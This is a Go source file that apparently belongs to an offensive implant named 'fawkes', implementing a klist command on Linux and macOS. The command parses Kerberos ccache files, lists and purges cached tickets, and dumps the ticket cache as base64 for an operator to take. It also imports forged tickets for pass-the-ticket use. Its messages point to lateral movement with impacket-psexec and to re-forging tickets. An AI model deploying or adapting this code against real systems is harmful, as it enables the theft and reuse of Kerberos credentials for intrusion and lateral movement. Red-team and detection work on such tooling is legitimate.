//go:build linux || darwin
// +build linux darwin

package commands

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// ccachePrincipal represents a principal in the ccache file
type ccachePrincipal struct {
	NameType   uint32
	Realm      string
	Components []string
}

func (p ccachePrincipal) String() string {
	name := strings.Join(p.Components, "/")
	if p.Realm != "" {
		return name + "@" + p.Realm
	}
	return name
}

// ccacheCredential represents a credential entry in the ccache file
type ccacheCredential struct {
	Client      ccachePrincipal
	Server      ccachePrincipal
	KeyType     int32 // changed from uint16 to match ccache v4 spec
	AuthTime    time.Time
	StartTime   time.Time
	EndTime     time.Time
	RenewTill   time.Time
	IsSKey      bool
	TicketFlags uint32
	TicketData  []byte
}

// findCcacheFile locates the Kerberos credential cache file
func findCcacheFile() string {
	// Check KRB5CCNAME environment variable first
	if ccname := os.Getenv("KRB5CCNAME"); ccname != "" {
		// Handle FILE: prefix
		if strings.HasPrefix(ccname, "FILE:") {
			return ccname[5:]
		}
		// Handle KEYRING: and other types
		if strings.Contains(ccname, ":") && !strings.HasPrefix(ccname, "/") {
			return "" // non-file ccache type
		}
		return ccname
	}
	// Default: /tmp/krb5cc_<uid>
	return fmt.Sprintf("/tmp/krb5cc_%d", os.Getuid())
}

// parseCcache reads and parses a ccache file
func parseCcache(path string) (*ccachePrincipal, []ccacheCredential, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, nil, err
	}
	defer f.Close()

	// Read version (2 bytes)
	var version uint16
	if err := binary.Read(f, binary.BigEndian, &version); err != nil {
		return nil, nil, fmt.Errorf("reading version: %v", err)
	}

	if version != 0x0504 && version != 0x0503 {
		return nil, nil, fmt.Errorf("unsupported ccache version: 0x%04X (expected 0x0503 or 0x0504)", version)
	}

	// For v4 (0x0504), skip header
	if version == 0x0504 {
		var headerLen uint16
		if err := binary.Read(f, binary.BigEndian, &headerLen); err != nil {
			return nil, nil, fmt.Errorf("reading header length: %v", err)
		}
		if headerLen > 0 {
			if _, err := io.CopyN(io.Discard, f, int64(headerLen)); err != nil {
				return nil, nil, fmt.Errorf("skipping header: %v", err)
			}
		}
	}

	// Read default principal
	defPrincipal, err := readCcachePrincipal(f)
	if err != nil {
		return nil, nil, fmt.Errorf("reading default principal: %v", err)
	}

	// Read credentials until EOF
	var creds []ccacheCredential
	for {
		cred, err := readCcacheCredential(f)
		if err == io.EOF || err == io.ErrUnexpectedEOF {
			break
		}
		if err != nil {
			break // stop on any parse error
		}
		creds = append(creds, *cred)
	}

	return defPrincipal, creds, nil
}

func readCcachePrincipal(r io.Reader) (*ccachePrincipal, error) {
	var p ccachePrincipal

	// Name type (4 bytes BE)
	if err := binary.Read(r, binary.BigEndian, &p.NameType); err != nil {
		return nil, err
	}

	// Number of components (4 bytes BE)
	var numComponents uint32
	if err := binary.Read(r, binary.BigEndian, &numComponents); err != nil {
		return nil, err
	}

	// Realm
	realm, err := readCcacheString(r)
	if err != nil {
		return nil, err
	}
	p.Realm = realm

	// Components
	for i := uint32(0); i < numComponents; i++ {
		comp, err := readCcacheString(r)
		if err != nil {
			return nil, err
		}
		p.Components = append(p.Components, comp)
	}

	return &p, nil
}

func readCcacheString(r io.Reader) (string, error) {
	var length uint32
	if err := binary.Read(r, binary.BigEndian, &length); err != nil {
		return "", err
	}
	if length > 65535 {
		return "", fmt.Errorf("string too long: %d", length)
	}
	buf := make([]byte, length)
	if _, err := io.ReadFull(r, buf); err != nil {
		return "", err
	}
	return string(buf), nil
}

func readCcacheCredential(r io.Reader) (*ccacheCredential, error) {
	var cred ccacheCredential

	// Client principal
	client, err := readCcachePrincipal(r)
	if err != nil {
		return nil, err
	}
	cred.Client = *client

	// Server principal
	server, err := readCcachePrincipal(r)
	if err != nil {
		return nil, err
	}
	cred.Server = *server

	// Keyblock: keytype (2 bytes) + pad (2 bytes) + keylen (4 bytes? no...)
	// Actually in ccache v4: keytype (2 bytes), then data (counted_octet_string)
	// counted_octet_string = length (4 bytes BE) + data
	var keytype uint16
	if err := binary.Read(r, binary.BigEndian, &keytype); err != nil {
		return nil, err
	}
	cred.KeyType = int32(keytype)

	// Skip key data
	if err := skipCcacheOctetString(r); err != nil {
		return nil, fmt.Errorf("skipping keyblock: %v", err)
	}

	// Times: authtime, starttime, endtime, renew_till (each 4 bytes BE, unix seconds)
	var times [4]uint32
	for i := range times {
		if err := binary.Read(r, binary.BigEndian, &times[i]); err != nil {
			return nil, err
		}
	}
	cred.AuthTime = time.Unix(int64(times[0]), 0)
	cred.StartTime = time.Unix(int64(times[1]), 0)
	cred.EndTime = time.Unix(int64(times[2]), 0)
	cred.RenewTill = time.Unix(int64(times[3]), 0)

	// is_skey (1 byte)
	var isSKey uint8
	if err := binary.Read(r, binary.BigEndian, &isSKey); err != nil {
		return nil, err
	}
	cred.IsSKey = isSKey != 0

	// ticket_flags (4 bytes BE)
	if err := binary.Read(r, binary.BigEndian, &cred.TicketFlags); err != nil {
		return nil, err
	}

	// Addresses: num_address (4 bytes BE), then for each: addrtype (2) + data (counted_octet_string)
	var numAddresses uint32
	if err := binary.Read(r, binary.BigEndian, &numAddresses); err != nil {
		return nil, err
	}
	for i := uint32(0); i < numAddresses; i++ {
		var addrType uint16
		if err := binary.Read(r, binary.BigEndian, &addrType); err != nil {
			return nil, err
		}
		if err := skipCcacheOctetString(r); err != nil {
			return nil, err
		}
	}

	// Authdata: num_authdata (4 bytes BE), then for each: ad_type (2) + data (counted_octet_string)
	var numAuthdata uint32
	if err := binary.Read(r, binary.BigEndian, &numAuthdata); err != nil {
		return nil, err
	}
	for i := uint32(0); i < numAuthdata; i++ {
		var adType uint16
		if err := binary.Read(r, binary.BigEndian, &adType); err != nil {
			return nil, err
		}
		if err := skipCcacheOctetString(r); err != nil {
			return nil, err
		}
	}

	// Ticket data (counted_octet_string)
	ticketData, err := readCcacheOctetString(r)
	if err != nil {
		return nil, err
	}
	cred.TicketData = ticketData

	// Second ticket (counted_octet_string) — skip
	if err := skipCcacheOctetString(r); err != nil {
		return nil, err
	}

	return &cred, nil
}

func readCcacheOctetString(r io.Reader) ([]byte, error) {
	var length uint32
	if err := binary.Read(r, binary.BigEndian, &length); err != nil {
		return nil, err
	}
	if length > 1048576 { // 1MB sanity limit
		return nil, fmt.Errorf("octet string too long: %d", length)
	}
	buf := make([]byte, length)
	if _, err := io.ReadFull(r, buf); err != nil {
		return nil, err
	}
	return buf, nil
}

func skipCcacheOctetString(r io.Reader) error {
	var length uint32
	if err := binary.Read(r, binary.BigEndian, &length); err != nil {
		return err
	}
	if length > 1048576 {
		return fmt.Errorf("octet string too long: %d", length)
	}
	_, err := io.CopyN(io.Discard, r, int64(length))
	return err
}

func klistImport(args klistArgs) structs.CommandResult {
	if args.Ticket == "" {
		return structs.CommandResult{
			Output:    "Error: -ticket parameter required (base64-encoded kirbi or ccache data)",
			Status:    "error",
			Completed: true,
		}
	}

	// Decode base64
	data, err := base64.StdEncoding.DecodeString(args.Ticket)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding base64 ticket data: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(data) < 4 {
		return structs.CommandResult{
			Output:    "Error: ticket data too short",
			Status:    "error",
			Completed: true,
		}
	}

	// Auto-detect format: ccache starts with 0x0503 or 0x0504, kirbi starts with 0x76 (APPLICATION 22)
	isCcache := (data[0] == 0x05 && (data[1] == 0x03 || data[1] == 0x04))
	isKirbi := data[0] == 0x76

	if !isCcache && !isKirbi {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: unrecognized ticket format (first byte: 0x%02x). Expected ccache (0x0503/0x0504) or kirbi (0x76).", data[0]),
			Status:    "error",
			Completed: true,
		}
	}

	var ccacheData []byte
	var formatName string

	if isCcache {
		// Already in ccache format — use directly
		ccacheData = data
		formatName = "ccache"
	} else {
		// Kirbi format — convert to ccache via the ticket command's helper
		// For now, write kirbi directly and let the user convert
		// Actually, we can write ccache by reusing ticketToCCache from ticket.go
		// But kirbi→ccache conversion requires parsing the KRB-CRED which is complex
		// Simple approach: write as .kirbi file and report usage instructions
		// Better approach: accept kirbi but write it as-is with instructions

		// For a proper PTT on Unix, we need ccache format
		// Let's try to parse the KRB-CRED and extract what we need
		// Actually, the simplest and most reliable approach: if it's kirbi,
		// tell the operator to use -format ccache with the ticket command instead.
		return structs.CommandResult{
			Output:    "Error: kirbi format detected. On Linux/macOS, use ccache format instead.\nRe-forge with: ticket -action forge ... -format ccache\nOr use impacket's ticketConverter.py to convert.",
			Status:    "error",
			Completed: true,
		}
	}

	// Determine output path
	ccachePath := args.Path
	if ccachePath == "" {
		ccachePath = fmt.Sprintf("/tmp/krb5cc_%d", os.Getuid())
	}

	// Write ccache file
	if err := os.WriteFile(ccachePath, ccacheData, 0600); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error writing ccache to %s: %v", ccachePath, err),
			Status:    "error",
			Completed: true,
		}
	}

	// Set KRB5CCNAME environment variable
	os.Setenv("KRB5CCNAME", ccachePath)

	// Parse the written ccache for display
	defPrincipal, creds, parseErr := parseCcache(ccachePath)

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[+] Ticket imported successfully (%s format, %d bytes)\n", formatName, len(ccacheData)))
	sb.WriteString(fmt.Sprintf("[+] Written to: %s\n", ccachePath))
	sb.WriteString(fmt.Sprintf("[+] KRB5CCNAME set to: %s\n", ccachePath))

	if parseErr == nil && defPrincipal != nil {
		sb.WriteString(fmt.Sprintf("\n    Principal: %s\n", defPrincipal.String()))
		sb.WriteString(fmt.Sprintf("    Tickets:   %d\n", len(creds)))
		for _, cred := range creds {
			sb.WriteString(fmt.Sprintf("    → %s (%s)\n", cred.Server.String(), etypeToNameKL(cred.KeyType)))
		}
	}

	sb.WriteString("\n[*] Kerberos auth is now available for tools using KRB5CCNAME.")
	sb.WriteString("\n[*] Use 'run' to execute Kerberos-aware tools (e.g., smbclient -k, impacket-psexec -k).")

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func klistList(args klistArgs) structs.CommandResult {
	ccachePath := findCcacheFile()
	if ccachePath == "" {
		return structs.CommandResult{
			Output:    "No file-based ccache found. KRB5CCNAME may use KEYRING or other non-file type.",
			Status:    "success",
			Completed: true,
		}
	}

	defPrincipal, creds, err := parseCcache(ccachePath)
	if err != nil {
		if os.IsNotExist(err) {
			return structs.CommandResult{
				Output:    fmt.Sprintf("No ccache file found at %s\nNo Kerberos tickets cached for this user.", ccachePath),
				Status:    "success",
				Completed: true,
			}
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error reading ccache %s: %v", ccachePath, err),
			Status:    "error",
			Completed: true,
		}
	}

	_ = defPrincipal // principal info is available via ccache metadata

	now := time.Now()
	var entries []klistTicketEntry

	for i, cred := range creds {
		// Apply server filter
		if args.Server != "" {
			filter := strings.ToLower(args.Server)
			serverStr := strings.ToLower(cred.Server.String())
			if !strings.Contains(serverStr, filter) {
				continue
			}
		}

		status := "valid"
		if !cred.EndTime.IsZero() && cred.EndTime.Before(now) && cred.EndTime.Year() > 1970 {
			status = "EXPIRED"
		}

		e := klistTicketEntry{
			Index:      i,
			Client:     cred.Client.String(),
			Server:     cred.Server.String(),
			Encryption: etypeToNameKL(cred.KeyType),
			Flags:      klistFormatFlags(cred.TicketFlags),
			Status:     status,
		}
		if cred.StartTime.Year() > 1970 {
			e.Start = cred.StartTime.Format("2006-01-02 15:04:05")
		}
		if cred.EndTime.Year() > 1970 {
			e.End = cred.EndTime.Format("2006-01-02 15:04:05")
		}
		if cred.RenewTill.Year() > 1970 {
			e.Renew = cred.RenewTill.Format("2006-01-02 15:04:05")
		}
		entries = append(entries, e)
	}

	if entries == nil {
		entries = []klistTicketEntry{}
	}
	data, err := json.Marshal(entries)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error marshaling output: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	return structs.CommandResult{
		Output:    string(data),
		Status:    "success",
		Completed: true,
	}
}

func klistPurge(args klistArgs) structs.CommandResult {
	ccachePath := findCcacheFile()
	if ccachePath == "" {
		return structs.CommandResult{
			Output:    "No file-based ccache found to purge.",
			Status:    "success",
			Completed: true,
		}
	}

	if err := os.Remove(ccachePath); err != nil {
		if os.IsNotExist(err) {
			return structs.CommandResult{
				Output:    "No ccache file to purge (already clean).",
				Status:    "success",
				Completed: true,
			}
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error removing ccache %s: %v", ccachePath, err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Kerberos ccache purged: %s", ccachePath),
		Status:    "success",
		Completed: true,
	}
}

func klistDump(args klistArgs) structs.CommandResult {
	ccachePath := findCcacheFile()
	if ccachePath == "" {
		return structs.CommandResult{
			Output:    "No file-based ccache found.",
			Status:    "error",
			Completed: true,
		}
	}

	data, err := os.ReadFile(ccachePath)
	if err != nil {
		if os.IsNotExist(err) {
			return structs.CommandResult{
				Output:    fmt.Sprintf("No ccache file at %s", ccachePath),
				Status:    "error",
				Completed: true,
			}
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error reading ccache: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	b64 := base64.StdEncoding.EncodeToString(data)

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[+] Dumped ccache %s (%d bytes)\n", ccachePath, len(data)))
	sb.WriteString("[+] Base64-encoded ccache (convert to kirbi with ticketConverter.py):\n\n")
	for i := 0; i < len(b64); i += 76 {
		end := i + 76
		if end > len(b64) {
			end = len(b64)
		}
		sb.WriteString(b64[i:end])
		sb.WriteString("\n")
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}
